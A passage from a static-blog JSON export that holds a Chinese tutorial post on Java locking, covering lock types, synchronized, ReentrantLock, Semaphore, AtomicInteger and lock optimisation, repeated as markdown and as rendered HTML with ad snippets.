可以把任意一个非NULL的对象当作锁。它属于独占锁，同时属于可重入锁。\n\n**Synchronized的作用范围**\n\n当做用于方法时，锁住的对象是对象的实例（this）。\n\n当做用于静态方法时，锁住的是Class实例，又因为Class的相关数据存储在永久带PermGen（JDK1.8则是metaspace），永久带是全局共享，因此静态方法锁相当于是类的一个全局锁，会锁住所有调用该方法的线程。\n\n当作用域一个对象实例时，锁住的是所有以该对象为锁的代码块。他有多个队列，当多个线程一起访问某个对象监视器时，对象监视器会将这些线程存储在不同的容器中。\n\n**Synchronized 核心组件**\n\nWait Set： 那些调用wait方法被阻塞的线程放置在这里\nContention List： 竞争队列，所有请求所得线程首先被放在这个竞争队列中\nEntry List： Contention List中的那些有资格成为候选资源的线程被移动到Entry List中\nOnDeck： 任意时刻，最多只有一个线程正在竞争锁资源，该线程被称为OnDeck\nOwner： 当前已经获取到资源锁的线程被称为Owner\n!Owner: 当前释放锁的线程\n\n### 2、ReentrantLock\n\nReentrantLock继承接口Lock并实现了接口中定义的方法，也是一种可重入锁，除了能完成Synchronized所能完成的所有工作外，还提供了诸如可响应中断锁、可轮询锁请求、定时锁等避免多线程死锁的方法。\n\nReentrantLock通过方法lock和unlock来进行加锁和解锁操作，与Synchronized会被JVM自动解锁不同，ReentrantLock加锁需要手动进行解锁。为了避免程序出现异常而无法正常解锁的情况，使用ReentrantLock必须在finally控制块中进行解锁操作。\n\n### 3、Semaphore 信号量\n\nSemaphore是一种基于计数的信号量，他可以设定一个阈值，基于此，多个线程竞争获取许可信号，做完自己的申请后归还，超过阈值后，线程申请许可信号量会被阻塞。Semaphore可以用来构建一些对象池、线程池等，比如数据库连接池。\n\nSemaphore基本能完成ReentrantLock的所有工作，使用方法也与之类似，通过acquire()与release()方法来获取和释放资源。经实测，Semaphore.acquire()默认为可响应中断锁，与ReentrantLock.lockInterruptibly()作用效果一致，也就是说在等待临界资源的过程中可以被Thread.interrupt()中断。\n\n此外，Semaphore也实现了可轮询的锁请求和定时锁的功能，除了方法名tryAcquire()与tryLock不同之外，其使用方法与ReentrantLock几乎一致，Semaphore也提供了公平和非公平锁的机制，也可以在构造函数中进行设定。\n\nSemaphore的释放也必须手动进行，因此与ReentrantLock一样，为了避免程序出现异常而无法正常解锁的情况，使用ReentrantLock必须在finally控制块中进行解锁操作。\n\n### 4、AtomicInteger\n\n此处AtomicInteger是一个提供原子操作的Integer类，类似的还有AtomicBoolean、AtomicLong、AtomicReference等。他们的实现原理相同，区别在于运算类型不同，令人兴奋的是，可以通过AtomicReference<V> 将一个对象的所有操作转换为原子操作。\n\n我们知道，在多线程程序中，诸如i++等运算不具备原子性，是不安全的线程操作之一。通常我们会使用synchronized将该操作变为一个原子操作，但JVM为此类特意提供了一些同步类，使得使用方便，且使程序运行效率变得更高。通过相关资料显示，使用AtomicInteger的性能是ReentantLock的好几倍。\n\n## 三、 锁的优化\n\n### 1、较少锁持有时间\n\n只在有线程安全的程序上加锁\n\n### 2、减少锁粒度\n\n将对象拆成小对象，大大增加并行度，降低锁竞争。降低了锁的竞争，偏向锁、轻量级锁的概率才会高，最典型的的减小锁粒度的案例就是ConcurrentHashMap。\n\n### 3、锁分离\n\n最常见的锁分离就是读写锁ReadWriteLock，根据功能分离成读锁和写锁，这样读读不互斥，读写互斥，写写互斥，既保证了线程安全，有提高了性能。读写分离思想可以延伸，只要操作互不影响，所就可以分离，比如LinkedBlockingQueue从头部取出，从尾部放数据。\n\n### 4、锁粗化\n\n通常情况下，为了保证多线程间的有效并发，会要求每个线程持有锁的时间尽量短，即在使用完公共资源后，应该立即释放锁。但是凡事都有一个度，如果对同一个锁不停的请求、同步、释放，其本身也会消耗宝贵的系统资源，反而不利于性能优化。\n\n### 5、锁消除\n\n锁消除是编译器级别的事，在即时编译器时，如果发现不可能被共享的对象，则可以消除这些对象的锁操作，多数是因为程序员编码不规范引起的。\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/java中的各种锁.md","raw":"---\ntitle: java中的各种锁\ndate: 2018-11-28 16:17:48\ntags: ['java','锁', 'CAS']\ncategories: Java\n---\n\n\n## 一、 Java中锁的分类\n\n### 乐观锁\n\n乐观锁是一种思想，即认为读多写少，遇到并发写的可能性低，每次去拿数据的时候都认为别人不会修改，所以不会上锁，但是在更新的时候会判断一下在此期间别人有没有去更新这个数据，采取在写时先读出版本号，然后加锁操作（比较跟上一次的版本号，如果一样则更新），如果失败则重复读-比较-写的操作。\n\njava中乐观锁基本都是通过CAS(Compare And Swap)实现的，CAS是一种更新的原子操作，比较当前的值和传入的值是否一样，一样则更新，否则失败。\n\n### 悲观锁\n\n悲观锁就是悲观思想，认为写多，遇到并发的可能性高，每次去拿数据的时候都认为别人会修改，所以每次在读写数据的时候都会先上锁。这样别人想读取数据就会直接block拿到锁，java中的悲观锁就是synchronized，AQS框架下的锁则是先尝试CAS乐观锁去获取锁，获取不到，才会转为悲观锁，如RetreenLock。\n\n### 自旋锁\n\n自旋锁的原理非常简单，如果持有锁的线程能在很短时间内释放资源，那么等待竞争锁的线程就不需要做内核态和用户态之间的切换进入阻塞状态，他们只需要等一等（自旋），等持有锁的线程释放锁后即可立即获取锁，这样就避免用户线程和内核的切换消耗。\n\n线程自旋是需要消耗CPU的，说白了就是再让CPU做无用功，如果一直获取不到锁，那县城也不能一直占用CPU自旋锁做无用功，所以需要设定一个最大自旋等待时间。\n\n如果持有锁的线程执行时间查过自旋等待的最大时间仍然没有释放锁，就会导致其他争用锁的线程在最大时间还是获取不到锁，这是争用线程会停止自旋进入阻塞状态。\n\n### 非公平锁\n\nJVM按照随机、就近原则分配锁的机制则称为不公平锁。非公平锁是指多个线程获取锁的顺序并不是按照申请的顺序，有可能后申请的线程比先申请的线程先获得锁。\n\n在java中，ReentrantLock可以通过构造函数指定该锁是公平锁还是非公平锁，默认是非公平锁。非公平锁实际执行效率要远远超出公平锁，因此除非有特殊需要，否则最常用的还是非公平锁的分配机制。\n\n对于synchronized而言，是一种非公平锁，由于其并不想ReentrantLock是通过AQS框架实现的线程调度，所有没有任何办法使其变为公平锁。\n\n### 公平锁\n\n与非公平锁相对，公平锁是按照线程申请的顺序进行锁的分配。通常先对锁获取请求的线程会先被分配到锁。由于公平锁会维护一个线程队列，因此相比非公平锁性能会下降5-10倍。\n\n### 可重入锁（递归锁）\n\n可重入锁又称递归锁，是指在一个线程的外层方法回去锁之后，在进入内层方法时会自动回去锁。在java中，ReentrantLock和Synchronized都是可重入锁。\n\n### ReadWriteLock 读写锁\n\n为了提高性能，Java中提供了读写锁，在读的地方用读锁，在写的地方用写锁，灵活控制，在没有写锁的情况下，读是无阻塞的，在一定情况下提高了程序的运行效率。读写锁分为读锁和写锁，多个读锁不互斥，读锁和写锁互斥，这是由jvm控制的，你只要上好相应的锁即可。\n\nJava中读写锁有个接口java.util.concurrent.locks.ReadWriteLock，也有具体的实现ReentrantReadWriteLock。\n\n### 共享锁和独占锁\n\njava并发包中提供的加锁模式分别为共享锁和独占锁。\n\n**1、独占锁**\n\n独占锁模式下，只有一个线程持有锁，ReentrantLock就是以独占锁实现的互斥锁。独占锁是一种悲观保守的加锁策略，他避免了读/读冲突，如果某个只读线程获取了锁，则其他读线程都只能等待，这种情况下就限制了不必要的并发性，应为读操作并不会影响数据的一致性。\n\n**2、共享锁**\n\n共享锁允许多个线程同时获得锁，并发访问共享资源，如：ReadWriteLock。共享锁是一种乐观锁，他放宽了加锁策略，允许多个执行读操作的线程同时访问共享资源。\n\nAQS内部类Node定义了两个常量SHARED和EXCLUSIVE，他们分别表示了AQS队列中等待线程获取锁的模式。\n\n### 重量级锁\n\nSynchronized是通过对象内部的一个叫做监视器锁（monitor）来实现的。但是监视器锁本质又是依赖于底层的操作系统的MutexLock实现的，而操作系统实现线程之间的切换这就需要从用户态转换为核心态，这个成本非常高，状态之间的转换需要相对比较长的时间，这就是为什么Synchronized效率低的原因。因此这种依赖于操作系统Mutex Lock实现的锁我们称之为“重量级锁”，JDK中对于Synchronized的优化，其核心就是为了减少这种重量级锁的使用。JDK1.6之后，为了减少锁和释放锁所带来的性能消耗，提高性能，引入了“轻量级锁”和“偏向锁”。\n\n### 轻量级锁\n\n锁的状态有四种：无锁状态、偏向锁、轻量级锁、重量级锁。\n\n随着锁的竞争，锁可以从偏向锁升级到轻量级锁，再升级到重量级锁。但是锁升级只能是单向的，也就是说只能从低到高，不会出现锁的降级。\n\n“轻量级锁”是相对于使用系统互斥量来实现的传统锁而言的，但是首先要强调一点的是，轻量级锁并不是用来代替重量级锁的，他的本意是在没有多线程竞争的前提下，减少传统的重量级锁产生的性能消耗。在解释轻量级锁的执行过程之前，先明白一点，轻量级锁所适应的场景是线程交替执行同步代码块的情况，如果存在同一时间访问统一锁的情况，就会导致轻量级锁膨胀为重量级锁。\n\n### 偏向锁\n\nHotspot的作者经过大量研究发现大多数情况下锁不仅不会存在多线程竞争，而且总是由同一个线程多次获取。偏向锁的目的是在某个线程获得锁之后，消除这个线程锁重入（CAS）的开销，看起来像是让这个线程得到了偏护。引入偏向锁的目的是为了在无多线程竞争条件下尽量减少不必要的轻量级锁执行路径，应为轻量级锁的获取和释放依赖多次CAS原子指令，而偏向锁只需要在置换ThreadID的时候依赖一次CAS原子指令（由于一旦出现多线程竞争的情况就必须撤销偏向锁，所以偏向锁的撤销消耗的性能必须小于节省下来的CAS原子指令的性能消耗）。上面说过，轻量级锁是为了在线程交替执行同步块的时候提高性能，而偏向锁则是在只有一个线程执行同步快时进一步提高性能。\n\n### 分段锁\n\n分段锁是一种设计，并不是具体的一种锁。在ConcurrentHashMap中，其并发的思想就是通过分段所的形式来实现高效的并发操作。\n\n\n\n## 二、 JAVA中几种锁的实现\n\n### 1、Synchronized 同步锁\n\nsynchronized 可以把任意一个非NULL的对象当作锁。它属于独占锁，同时属于可重入锁。\n\n**Synchronized的作用范围**\n\n当做用于方法时，锁住的对象是对象的实例（this）。\n\n当做用于静态方法时，锁住的是Class实例，又因为Class的相关数据存储在永久带PermGen（JDK1.8则是metaspace），永久带是全局共享，因此静态方法锁相当于是类的一个全局锁，会锁住所有调用该方法的线程。\n\n当作用域一个对象实例时，锁住的是所有以该对象为锁的代码块。他有多个队列，当多个线程一起访问某个对象监视器时，对象监视器会将这些线程存储在不同的容器中。\n\n**Synchronized 核心组件**\n\nWait Set： 那些调用wait方法被阻塞的线程放置在这里\nContention List： 竞争队列，所有请求所得线程首先被放在这个竞争队列中\nEntry List： Contention List中的那些有资格成为候选资源的线程被移动到Entry List中\nOnDeck： 任意时刻，最多只有一个线程正在竞争锁资源，该线程被称为OnDeck\nOwner： 当前已经获取到资源锁的线程被称为Owner\n!Owner: 当前释放锁的线程\n\n### 2、ReentrantLock\n\nReentrantLock继承接口Lock并实现了接口中定义的方法，也是一种可重入锁，除了能完成Synchronized所能完成的所有工作外，还提供了诸如可响应中断锁、可轮询锁请求、定时锁等避免多线程死锁的方法。\n\nReentrantLock通过方法lock和unlock来进行加锁和解锁操作，与Synchronized会被JVM自动解锁不同，ReentrantLock加锁需要手动进行解锁。为了避免程序出现异常而无法正常解锁的情况，使用ReentrantLock必须在finally控制块中进行解锁操作。\n\n### 3、Semaphore 信号量\n\nSemaphore是一种基于计数的信号量，他可以设定一个阈值，基于此，多个线程竞争获取许可信号，做完自己的申请后归还，超过阈值后，线程申请许可信号量会被阻塞。Semaphore可以用来构建一些对象池、线程池等，比如数据库连接池。\n\nSemaphore基本能完成ReentrantLock的所有工作，使用方法也与之类似，通过acquire()与release()方法来获取和释放资源。经实测，Semaphore.acquire()默认为可响应中断锁，与ReentrantLock.lockInterruptibly()作用效果一致，也就是说在等待临界资源的过程中可以被Thread.interrupt()中断。\n\n此外，Semaphore也实现了可轮询的锁请求和定时锁的功能，除了方法名tryAcquire()与tryLock不同之外，其使用方法与ReentrantLock几乎一致，Semaphore也提供了公平和非公平锁的机制，也可以在构造函数中进行设定。\n\nSemaphore的释放也必须手动进行，因此与ReentrantLock一样，为了避免程序出现异常而无法正常解锁的情况，使用ReentrantLock必须在finally控制块中进行解锁操作。\n\n### 4、AtomicInteger\n\n此处AtomicInteger是一个提供原子操作的Integer类，类似的还有AtomicBoolean、AtomicLong、AtomicReference等。他们的实现原理相同，区别在于运算类型不同，令人兴奋的是，可以通过AtomicReference<V> 将一个对象的所有操作转换为原子操作。\n\n我们知道，在多线程程序中，诸如i++等运算不具备原子性，是不安全的线程操作之一。通常我们会使用synchronized将该操作变为一个原子操作，但JVM为此类特意提供了一些同步类，使得使用方便，且使程序运行效率变得更高。通过相关资料显示，使用AtomicInteger的性能是ReentantLock的好几倍。\n\n## 三、 锁的优化\n\n### 1、较少锁持有时间\n\n只在有线程安全的程序上加锁\n\n### 2、减少锁粒度\n\n将对象拆成小对象，大大增加并行度，降低锁竞争。降低了锁的竞争，偏向锁、轻量级锁的概率才会高，最典型的的减小锁粒度的案例就是ConcurrentHashMap。\n\n### 3、锁分离\n\n最常见的锁分离就是读写锁ReadWriteLock，根据功能分离成读锁和写锁，这样读读不互斥，读写互斥，写写互斥，既保证了线程安全，有提高了性能。读写分离思想可以延伸，只要操作互不影响，所就可以分离，比如LinkedBlockingQueue从头部取出，从尾部放数据。\n\n### 4、锁粗化\n\n通常情况下，为了保证多线程间的有效并发，会要求每个线程持有锁的时间尽量短，即在使用完公共资源后，应该立即释放锁。但是凡事都有一个度，如果对同一个锁不停的请求、同步、释放，其本身也会消耗宝贵的系统资源，反而不利于性能优化。\n\n### 5、锁消除\n\n锁消除是编译器级别的事，在即时编译器时，如果发现不可能被共享的对象，则可以消除这些对象的锁操作，多数是因为程序员编码不规范引起的。\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"java中的各种锁","published":1,"updated":"2019-06-26T03:52:03.504Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2mh004fo25tcelkaz7j","content":"<h2 id=\"一、-Java中锁的分类\"><a href=\"#一、-Java中锁的分类\" class=\"headerlink\" title=\"一、 Java中锁的分类\"></a>一、 Java中锁的分类</h2><h3 id=\"乐观锁\"><a href=\"#乐观锁\" class=\"headerlink\" title=\"乐观锁\"></a>乐观锁</h3><p>乐观锁是一种思想，即认为读多写少，遇到并发写的可能性低，每次去拿数据的时候都认为别人不会修改，所以不会上锁，但是在更新的时候会判断一下在此期间别人有没有去更新这个数据，采取在写时先读出版本号，然后加锁操作（比较跟上一次的版本号，如果一样则更新），如果失败则重复读-比较-写的操作。</p>\n<p>java中乐观锁基本都是通过CAS(Compare And Swap)实现的，CAS是一种更新的原子操作，比较当前的值和传入的值是否一样，一样则更新，否则失败。</p>\n<h3 id=\"悲观锁\"><a href=\"#悲观锁\" class=\"headerlink\" title=\"悲观锁\"></a>悲观锁</h3><p>悲观锁就是悲观思想，认为写多，遇到并发的可能性高，每次去拿数据的时候都认为别人会修改，所以每次在读写数据的时候都会先上锁。这样别人想读取数据就会直接block拿到锁，java中的悲观锁就是synchronized，AQS框架下的锁则是先尝试CAS乐观锁去获取锁，获取不到，才会转为悲观锁，如RetreenLock。</p>\n<h3 id=\"自旋锁\"><a href=\"#自旋锁\" class=\"headerlink\" title=\"自旋锁\"></a>自旋锁</h3><p>自旋锁的原理非常简单，如果持有锁的线程能在很短时间内释放资源，那么等待竞争锁的线程就不需要做内核态和用户态之间的切换进入阻塞状态，他们只需要等一等（自旋），等持有锁的线程释放锁后即可立即获取锁，这样就避免用户线程和内核的切换消耗。</p>\n<p>线程自旋是需要消耗CPU的，说白了就是再让CPU做无用功，如果一直获取不到锁，那县城也不能一直占用CPU自旋锁做无用功，所以需要设定一个最大自旋等待时间。</p>\n<p>如果持有锁的线程执行时间查过自旋等待的最大时间仍然没有释放锁，就会导致其他争用锁的线程在最大时间还是获取不到锁，这是争用线程会停止自旋进入阻塞状态。</p>\n<h3 id=\"非公平锁\"><a href=\"#非公平锁\" class=\"headerlink\" title=\"非公平锁\"></a>非公平锁</h3><p>JVM按照随机、就近原则分配锁的机制则称为不公平锁。非公平锁是指多个线程获取锁的顺序并不是按照申请的顺序，有可能后申请的线程比先申请的线程先获得锁。</p>\n<p>在java中，ReentrantLock可以通过构造函数指定该锁是公平锁还是非公平锁，默认是非公平锁。非公平锁实际执行效率要远远超出公平锁，因此除非有特殊需要，否则最常用的还是非公平锁的分配机制。</p>\n<p>对于synchronized而言，是一种非公平锁，由于其并不想ReentrantLock是通过AQS框架实现的线程调度，所有没有任何办法使其变为公平锁。</p>\n<h3 id=\"公平锁\"><a href=\"#公平锁\" class=\"headerlink\" title=\"公平锁\"></a>公平锁</h3><p>与非公平锁相对，公平锁是按照线程申请的顺序进行锁的分配。通常先对锁获取请求的线程会先被分配到锁。由于公平锁会维护一个线程队列，因此相比非公平锁性能会下降5-10倍。</p>\n<h3 id=\"可重入锁（递归锁）\"><a href=\"#可重入锁（递归锁）\" class=\"headerlink\" title=\"可重入锁（递归锁）\"></a>可重入锁（递归锁）</h3><p>可重入锁又称递归锁，是指在一个线程的外层方法回去锁之后，在进入内层方法时会自动回去锁。在java中，ReentrantLock和Synchronized都是可重入锁。</p>\n<h3 id=\"ReadWriteLock-读写锁\"><a href=\"#ReadWriteLock-读写锁\" class=\"headerlink\" title=\"ReadWriteLock 读写锁\"></a>ReadWriteLock 读写锁</h3><p>为了提高性能，Java中提供了读写锁，在读的地方用读锁，在写的地方用写锁，灵活控制，在没有写锁的情况下，读是无阻塞的，在一定情况下提高了程序的运行效率。读写锁分为读锁和写锁，多个读锁不互斥，读锁和写锁互斥，这是由jvm控制的，你只要上好相应的锁即可。</p>\n<p>Java中读写锁有个接口java.util.concurrent.locks.ReadWriteLock，也有具体的实现ReentrantReadWriteLock。</p>\n<h3 id=\"共享锁和独占锁\"><a href=\"#共享锁和独占锁\" class=\"headerlink\" title=\"共享锁和独占锁\"></a>共享锁和独占锁</h3><p>java并发包中提供的加锁模式分别为共享锁和独占锁。</p>\n<p><strong>1、独占锁</strong></p>\n<p>独占锁模式下，只有一个线程持有锁，ReentrantLock就是以独占锁实现的互斥锁。独占锁是一种悲观保守的加锁策略，他避免了读/读冲突，如果某个只读线程获取了锁，则其他读线程都只能等待，这种情况下就限制了不必要的并发性，应为读操作并不会影响数据的一致性。</p>\n<p><strong>2、共享锁</strong></p>\n<p>共享锁允许多个线程同时获得锁，并发访问共享资源，如：ReadWriteLock。共享锁是一种乐观锁，他放宽了加锁策略，允许多个执行读操作的线程同时访问共享资源。</p>\n<p>AQS内部类Node定义了两个常量SHARED和EXCLUSIVE，他们分别表示了AQS队列中等待线程获取锁的模式。</p>\n<h3 id=\"重量级锁\"><a href=\"#重量级锁\" class=\"headerlink\" title=\"重量级锁\"></a>重量级锁</h3><p>Synchronized是通过对象内部的一个叫做监视器锁（monitor）来实现的。但是监视器锁本质又是依赖于底层的操作系统的MutexLock实现的，而操作系统实现线程之间的切换这就需要从用户态转换为核心态，这个成本非常高，状态之间的转换需要相对比较长的时间，这就是为什么Synchronized效率低的原因。因此这种依赖于操作系统Mutex Lock实现的锁我们称之为“重量级锁”，JDK中对于Synchronized的优化，其核心就是为了减少这种重量级锁的使用。JDK1.6之后，为了减少锁和释放锁所带来的性能消耗，提高性能，引入了“轻量级锁”和“偏向锁”。</p>\n<h3 id=\"轻量级锁\"><a href=\"#轻量级锁\" class=\"headerlink\" title=\"轻量级锁\"></a>轻量级锁</h3><p>锁的状态有四种：无锁状态、偏向锁、轻量级锁、重量级锁。</p>\n<p>随着锁的竞争，锁可以从偏向锁升级到轻量级锁，再升级到重量级锁。但是锁升级只能是单向的，也就是说只能从低到高，不会出现锁的降级。</p>\n<p>“轻量级锁”是相对于使用系统互斥量来实现的传统锁而言的，但是首先要强调一点的是，轻量级锁并不是用来代替重量级锁的，他的本意是在没有多线程竞争的前提下，减少传统的重量级锁产生的性能消耗。在解释轻量级锁的执行过程之前，先明白一点，轻量级锁所适应的场景是线程交替执行同步代码块的情况，如果存在同一时间访问统一锁的情况，就会导致轻量级锁膨胀为重量级锁。</p>\n<h3 id=\"偏向锁\"><a href=\"#偏向锁\" class=\"headerlink\" title=\"偏向锁\"></a>偏向锁</h3><p>Hotspot的作者经过大量研究发现大多数情况下锁不仅不会存在多线程竞争，而且总是由同一个线程多次获取。偏向锁的目的是在某个线程获得锁之后，消除这个线程锁重入（CAS）的开销，看起来像是让这个线程得到了偏护。引入偏向锁的目的是为了在无多线程竞争条件下尽量减少不必要的轻量级锁执行路径，应为轻量级锁的获取和释放依赖多次CAS原子指令，而偏向锁只需要在置换ThreadID的时候依赖一次CAS原子指令（由于一旦出现多线程竞争的情况就必须撤销偏向锁，所以偏向锁的撤销消耗的性能必须小于节省下来的CAS原子指令的性能消耗）。上面说过，轻量级锁是为了在线程交替执行同步块的时候提高性能，而偏向锁则是在只有一个线程执行同步快时进一步提高性能。</p>\n<h3 id=\"分段锁\"><a href=\"#分段锁\" class=\"headerlink\" title=\"分段锁\"></a>分段锁</h3><p>分段锁是一种设计，并不是具体的一种锁。在ConcurrentHashMap中，其并发的思想就是通过分段所的形式来实现高效的并发操作。</p>\n<h2 id=\"二、-JAVA中几种锁的实现\"><a href=\"#二、-JAVA中几种锁的实现\" class=\"headerlink\" title=\"二、 JAVA中几种锁的实现\"></a>二、 JAVA中几种锁的实现</h2><h3 id=\"1、Synchronized-同步锁\"><a href=\"#1、Synchronized-同步锁\" class=\"headerlink\" title=\"1、Synchronized 同步锁\"></a>1、Synchronized 同步锁</h3><p>synchronized 可以把任意一个非NULL的对象当作锁。它属于独占锁，同时属于可重入锁。</p>\n<p><strong>Synchronized的作用范围</strong></p>\n<p>当做用于方法时，锁住的对象是对象的实例（this）。</p>\n<p>当做用于静态方法时，锁住的是Class实例，又因为Class的相关数据存储在永久带PermGen（JDK1.8则是metaspace），永久带是全局共享，因此静态方法锁相当于是类的一个全局锁，会锁住所有调用该方法的线程。</p>\n<p>当作用域一个对象实例时，锁住的是所有以该对象为锁的代码块。他有多个队列，当多个线程一起访问某个对象监视器时，对象监视器会将这些线程存储在不同的容器中。</p>\n<p><strong>Synchronized 核心组件</strong></p>\n<p>Wait Set： 那些调用wait方法被阻塞的线程放置在这里<br>Contention List： 竞争队列，所有请求所得线程首先被放在这个竞争队列中<br>Entry List： Contention List中的那些有资格成为候选资源的线程被移动到Entry List中<br>OnDeck： 任意时刻，最多只有一个线程正在竞争锁资源，该线程被称为OnDeck<br>Owner： 当前已经获取到资源锁的线程被称为Owner<br>!Owner: 当前释放锁的线程</p>\n<h3 id=\"2、ReentrantLock\"><a href=\"#2、ReentrantLock\" class=\"headerlink\" title=\"2、ReentrantLock\"></a>2、ReentrantLock</h3><p>ReentrantLock继承接口Lock并实现了接口中定义的方法，也是一种可重入锁，除了能完成Synchronized所能完成的所有工作外，还提供了诸如可响应中断锁、可轮询锁请求、定时锁等避免多线程死锁的方法。</p>\n<p>ReentrantLock通过方法lock和unlock来进行加锁和解锁操作，与Synchronized会被JVM自动解锁不同，ReentrantLock加锁需要手动进行解锁。为了避免程序出现异常而无法正常解锁的情况，使用ReentrantLock必须在finally控制块中进行解锁操作。</p>\n<h3 id=\"3、Semaphore-信号量\"><a href=\"#3、Semaphore-信号量\" class=\"headerlink\" title=\"3、Semaphore 信号量\"></a>3、Semaphore 信号量</h3><p>Semaphore是一种基于计数的信号量，他可以设定一个阈值，基于此，多个线程竞争获取许可信号，做完自己的申请后归还，超过阈值后，线程申请许可信号量会被阻塞。Semaphore可以用来构建一些对象池、线程池等，比如数据库连接池。</p>\n<p>Semaphore基本能完成ReentrantLock的所有工作，使用方法也与之类似，通过acquire()与release()方法来获取和释放资源。经实测，Semaphore.acquire()默认为可响应中断锁，与ReentrantLock.lockInterruptibly()作用效果一致，也就是说在等待临界资源的过程中可以被Thread.interrupt()中断。</p>\n<p>此外，Semaphore也实现了可轮询的锁请求和定时锁的功能，除了方法名tryAcquire()与tryLock不同之外，其使用方法与ReentrantLock几乎一致，Semaphore也提供了公平和非公平锁的机制，也可以在构造函数中进行设定。</p>\n<p>Semaphore的释放也必须手动进行，因此与ReentrantLock一样，为了避免程序出现异常而无法正常解锁的情况，使用ReentrantLock必须在finally控制块中进行解锁操作。</p>\n<h3 id=\"4、AtomicInteger\"><a href=\"#4、AtomicInteger\" class=\"headerlink\" title=\"4、AtomicInteger\"></a>4、AtomicInteger</h3><p>此处AtomicInteger是一个提供原子操作的Integer类，类似的还有AtomicBoolean、AtomicLong、AtomicReference等。他们的实现原理相同，区别在于运算类型不同，令人兴奋的是，可以通过AtomicReference<v> 将一个对象的所有操作转换为原子操作。</v></p>\n<p>我们知道，在多线程程序中，诸如i++等运算不具备原子性，是不安全的线程操作之一。通常我们会使用synchronized将该操作变为一个原子操作，但JVM为此类特意提供了一些同步类，使得使用方便，且使程序运行效率变得更高。通过相关资料显示，使用AtomicInteger的性能是ReentantLock的好几倍。</p>\n<h2 id=\"三、-锁的优化\"><a href=\"#三、-锁的优化\" class=\"headerlink\" title=\"三、 锁的优化\"></a>三、 锁的优化</h2><h3 id=\"1、较少锁持有时间\"><a href=\"#1、较少锁持有时间\" class=\"headerlink\" title=\"1、较少锁持有时间\"></a>1、较少锁持有时间</h3><p>只在有线程安全的程序上加锁</p>\n<h3 id=\"2、减少锁粒度\"><a href=\"#2、减少锁粒度\" class=\"headerlink\" title=\"2、减少锁粒度\"></a>2、减少锁粒度</h3><p>将对象拆成小对象，大大增加并行度，降低锁竞争。降低了锁的竞争，偏向锁、轻量级锁的概率才会高，最典型的的减小锁粒度的案例就是ConcurrentHashMap。</p>\n<h3 id=\"3、锁分离\"><a href=\"#3、锁分离\" class=\"headerlink\" title=\"3、锁分离\"></a>3、锁分离</h3><p>最常见的锁分离就是读写锁ReadWriteLock，根据功能分离成读锁和写锁，这样读读不互斥，读写互斥，写写互斥，既保证了线程安全，有提高了性能。读写分离思想可以延伸，只要操作互不影响，所就可以分离，比如LinkedBlockingQueue从头部取出，从尾部放数据。</p>\n<h3 id=\"4、锁粗化\"><a href=\"#4、锁粗化\" class=\"headerlink\" title=\"4、锁粗化\"></a>4、锁粗化</h3><p>通常情况下，为了保证多线程间的有效并发，会要求每个线程持有锁的时间尽量短，即在使用完公共资源后，应该立即释放锁。但是凡事都有一个度，如果对同一个锁不停的请求、同步、释放，其本身也会消耗宝贵的系统资源，反而不利于性能优化。</p>\n<h3 id=\"5、锁消除\"><a href=\"#5、锁消除\" class=\"headerlink\" title=\"5、锁消除\"></a>5、锁消除</h3><p>锁消除是编译器级别的事，在即时编译器时，如果发现不可能被共享的对象，则可以消除这些对象的锁操作，多数是因为程序员编码不规范引起的。</p>\n<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"一、-Java中锁的分类\"><a href=\"#一、-Java中锁的分类\" class=\"headerlink\" title=\"一、 Java中锁的分类\"></a>一、 Java中锁的分类</h2><h3 id=\"乐观锁\"><a href=\"#乐观锁\" class=\"headerlink\" title=\"乐观锁\"></a>乐观锁</h3><p>乐观锁是一种思想，即认为读多写少，遇到并发写的可能性低，每次去拿数据的时候都认为别人不会修改，所以不会上锁，但是在更新的时候会判断一下在此期间别人有没有去更新这个数据，采取在写时先读出版本号，然后加锁操作（比较跟上一次的版本号，如果一样则更新），如果失败则重复读-比较-写的操作。</p>\n<p>java中乐观锁基本都是通过CAS(Compare And Swap)实现的，CAS是一种更新的原子操作，比较当前的值和传入的值是否一样，一样则更新，否则失败。</p>\n<h3 id=\"悲观锁\"><a href=\"#悲观锁\" class=\"headerlink\" title=\"悲观锁\"></a>悲观锁</h3><p>悲观锁就是悲观思想，认为写多，遇到并发的可能性高，每次去拿数据的时候都认为别人会修改，所以每次在读写数据的时候都会先上锁。这样别人想读取数据就会直接block拿到锁，java中的悲观锁就是synchronized，AQS框架下的锁则是先尝试CAS乐观锁去获取锁，获取不到，才会转为悲观锁，如RetreenLock。</p>\n<h3 id=\"自旋锁\"><a href=\"#自旋锁\" class=\"headerlink\" 